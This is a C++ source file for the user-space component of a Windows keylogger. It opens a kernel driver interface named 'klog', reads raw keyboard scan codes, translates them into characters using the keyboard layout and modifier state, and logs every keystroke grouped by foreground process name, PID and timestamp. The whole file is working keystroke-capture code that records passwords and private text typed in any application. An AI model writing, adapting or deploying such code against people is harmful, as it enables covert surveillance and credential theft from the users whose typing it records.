#include "KbInputDataProcessor.h"

#include <psapi.h>
#include <iostream>
#include <iomanip>
#include <format>
#include <sstream>
#include <csignal>

KbInputDataProcessor::KbInputDataProcessor(std::wostream& out)
    : out{out}
{
    if (!setupHardwareDeviceInfo()) {
        return;
    }

    deviceInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    if (!findKlogDeviceInterface()) {
        return;
    }

    if (!connectToKlogDriver()) {
        return;
    }
    
    if (!SetConsoleCtrlHandler(KbInputDataProcessor::consoleHandler, TRUE)) {
        std::wcerr << std::format(L"Failed to setup console handler. Error code 0x{:X}", GetLastError());
        return;
    }

    isAllSetup = true;
    isRunning = false;
}

KbInputDataProcessor::~KbInputDataProcessor()
{
    if (device) {
        CloseHandle(device);
    }
    if (hardwareDeviceInfo) {
        SetupDiDestroyDeviceInfoList(hardwareDeviceInfo);
    }
    if (deviceInterfaceDetailData) {
        std::free(deviceInterfaceDetailData);
    }
    if (inputDataAddedEvent) {
        CloseHandle(inputDataAddedEvent);
    }
}

bool KbInputDataProcessor::isSetup() const
{
    return isAllSetup;
}

void KbInputDataProcessor::start()
{
    if (!isAllSetup) {
        std::wcerr << L"Failed to start processing keyboard input data. KbInputDataProcessor is not setup\n";
        return;
    }

    isRunning = true;

    while (isRunning) {
        DWORD waitResult = WaitForSingleObject(inputDataAddedEvent, INFINITE);

        if (waitResult == WAIT_OBJECT_0) {
            ResetEvent(inputDataAddedEvent);

            if (!DeviceIoControl(device, IOCTL_KLOG_GET_INPUT_DATA, NULL, 0,
                                 inpData, sizeof(inpData), &bytesReturned, NULL)) {
                std::wcerr << std::format(L"DeviceIoControl with IOCTL_KLOG_GET_INPUT_DATA failed. "
                                          L"Error code 0x{:X}\n", GetLastError());
                isRunning = false;
                break;
            }
        }
        else {
            std::wcerr << std::format(L"WaitForSingleObject failed. Error code 0x{:X}\n",
                                      GetLastError());
            isRunning = false;
            break;
        }

        if (bytesReturned > 0) {
            printInputData();
        }

        bytesReturned = 0;
    }

    printFooter();
}

bool KbInputDataProcessor::setupHardwareDeviceInfo()
{
    hardwareDeviceInfo = SetupDiGetClassDevsW((LPGUID) &GUID_DEVINTERFACE_KLOG, NULL, NULL,
                                              (DIGCF_PRESENT | DIGCF_DEVICEINTERFACE));
    if (hardwareDeviceInfo == INVALID_HANDLE_VALUE) {
        std::wcerr << std::format(L"SetupDiGetClassDevs failed. Error code 0x{:X}\n",
                                  GetLastError());
        return false;
    }

    return true;
}

bool KbInputDataProcessor::findKlogDeviceInterface()
{
    if (!SetupDiEnumDeviceInterfaces(hardwareDeviceInfo, NULL,
                                     (LPGUID) &GUID_DEVINTERFACE_KLOG, 0, &deviceInterfaceData)) {
        std::wcerr << std::format(L"SetupDiEnumDeviceInterfaces failed. Error code 0x{:X}\n",
                                  GetLastError());
        return false;
    }

    if (!SetupDiGetDeviceInterfaceDetailW(hardwareDeviceInfo, &deviceInterfaceData,
                                         NULL, 0, &requiredLength, NULL)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            std::wcerr << std::format(L"SetupDiGetDeviceInterfaceDetail failed when retrieving "
                                      L"device interface data. Error code 0x{:X}\n",
                                      GetLastError());
            return false;
        }
    }

    predictedLength = requiredLength;
    deviceInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA) std::malloc(predictedLength);
    if (deviceInterfaceDetailData) {
        deviceInterfaceDetailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA);
    }
    else {
        std::wcerr << L"Unable to allocate " << predictedLength << L" bytes for device interface details.\n";
        return false;
    }

    if (!SetupDiGetDeviceInterfaceDetailW(hardwareDeviceInfo, &deviceInterfaceData,
                                         deviceInterfaceDetailData,
                                         predictedLength, &requiredLength, NULL)) {
        std::wcerr << std::format(L"SetupDiGetDeviceInterfaceDetail failed when retrieving "
                                  L"device interface detail data. Error code 0x{:X}\n",
                                  GetLastError());
        return false;
    }

    return true;
}

bool KbInputDataProcessor::connectToKlogDriver()
{
    if (!deviceInterfaceDetailData) {
        std::wcerr << L"No device interfaces present\n";
        return false;
    }

    device = CreateFileW(deviceInterfaceDetailData->DevicePath, GENERIC_READ | GENERIC_WRITE,
                         0, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        std::wcerr << std::format(L"Failed to open driver via device path. Error code 0x{:X}\n",
                                  GetLastError());
        return false;
    }

    if (!DeviceIoControl(device, IOCTL_KLOG_INIT, NULL, 0,
                         &inpData, sizeof(inpData), &bytesReturned, NULL)) {
        std::wcerr << std::format(L"Initialization of klog failed. Error code 0x{:X}\n",
                                  GetLastError());
        return false;
    }

    inputDataAddedEvent = OpenEventW(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, UM_NOTIF_EVENT_NAME);
    if (!inputDataAddedEvent) {
        std::wcerr << std::format(L"Failed to open KeyboardInputDataAddedEvent. Error code 0x{:X}\n",
                                  GetLastError());
        return false;
    }

    return true;
}

BOOL KbInputDataProcessor::consoleHandler(DWORD signal)
{
    if (signal == CTRL_C_EVENT || signal == CTRL_CLOSE_EVENT 
            || signal == CTRL_BREAK_EVENT || signal == CTRL_LOGOFF_EVENT 
            || signal == CTRL_SHUTDOWN_EVENT) {
        isRunning = false;
        return TRUE;
    }

    return FALSE;
}

void KbInputDataProcessor::printInputData()
{
    DWORD processId = getForegroundWindowThreadProcessId();
    if (processId == 0) {
        std::wcerr << std::format(L"Failed to retrieve process id. Error code 0x{:X}\n",
                                  GetLastError());
        return;
    }
    
    if (currentProcessId != processId) {            // If the user has changed foreground window
        printFooter();
        currentProcessId = processId;
        printHeader();
    }

    HKL currentKeyboardLayout = GetKeyboardLayout(currentThreadId);

    for (ULONG i = 0; i < (bytesReturned / sizeof(inpData[0])); ++i) {
        // Ignore fake shift
        if ((inpData[i].Flags & KEY_E0) && inpData[i].MakeCode == 0x2A) {
            continue;
        }
        
        determineKeboardState(inpData[i]);
        if (inpData[i].Flags == KEY_MAKE) {         // Process only key press
            out << kbMakeCodeConverter.convertToCharacter(inpData[i].MakeCode, currentKeyboardLayout,
                                                          isShiftPressed, isCapsLockEnabled, isNumLockEnabled) 
                << L" " << std::flush;
        }
        else if (inpData[i].Flags == KEY_E0) {      // Process extended key press (0xE0XX keys)
            out << kbMakeCodeConverter.convertToCharacter(inpData[i].MakeCode | 0xE000, currentKeyboardLayout,
                                                          isShiftPressed, isCapsLockEnabled, isNumLockEnabled) 
                << L" " << std::flush;
        }
    }
}

DWORD KbInputDataProcessor::getForegroundWindowThreadProcessId()
{
    HWND    foregroundWindow = GetForegroundWindow();
    DWORD   processId = 0;

    currentThreadId = GetWindowThreadProcessId(foregroundWindow, &processId);

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!processHandle) {
        std::wcerr << std::format(L"Failed to open process with id {}. Error code 0x{:X}\n",
                                  processId, GetLastError());
        return processId;
    }

    if (!GetModuleBaseNameW(processHandle, nullptr, processName, MAX_PATH)) {
        std::wcerr << std::format(L"Failed to retrieve name of process with id {}. Error code 0x{:X}\n",
                                  processId, GetLastError());
        CloseHandle(processHandle);
        return processId;
    }

    CloseHandle(processHandle);

    return processId;
}

void KbInputDataProcessor::printHeader()
{
    std::time_t now = std::time(nullptr);
    std::tm local_time;
    localtime_s(&local_time, &now);
    auto timeFormatted = std::put_time(&local_time, L"%Y-%m-%d %H:%M:%S");
    
    std::wostringstream strStream;
    strStream << timeFormatted;
    std::wstring timeString = strStream.str();

    out << std::format(L"[{}, pid {}, started {}]\n",
                       processName, currentProcessId, timeString);
}

void KbInputDataProcessor::printFooter()
{
    // The footer is printed before the header for each foreground window in the log,
    // but it should not be printed before the header for the first foreground window 
    static bool isFirstLine = true;

    if (isFirstLine) {
        isFirstLine = false;
        return;
    }

    std::time_t now = std::time(nullptr);
    std::tm local_time;
    localtime_s(&local_time, &now);
    auto timeFormatted = std::put_time(&local_time, L"%Y-%m-%d %H:%M:%S");

    std::wostringstream strStream;
    strStream << timeFormatted;
    std::wstring timeString = strStream.str();

    out << std::format(L"\n[ended {}]\n\n", timeString);
}

void KbInputDataProcessor::determineKeboardState(KEYBOARD_INPUT_DATA inpData)
{
    if (inpData.MakeCode == Key::LShift || inpData.MakeCode == Key::RShift) {
        if (inpData.Flags == KEY_MAKE) {
            isShiftPressed = true;
        }
        else if (inpData.Flags == KEY_BREAK) {
            isShiftPressed = false;
        }
    }

    if (inpData.MakeCode == Key::CapsLock && inpData.Flags == KEY_MAKE) {
        isCapsLockEnabled = !isCapsLockEnabled;
    }

    if (inpData.MakeCode == Key::NumLock && inpData.Flags == KEY_MAKE) {
        isNumLockEnabled = !isNumLockEnabled;
    }
}
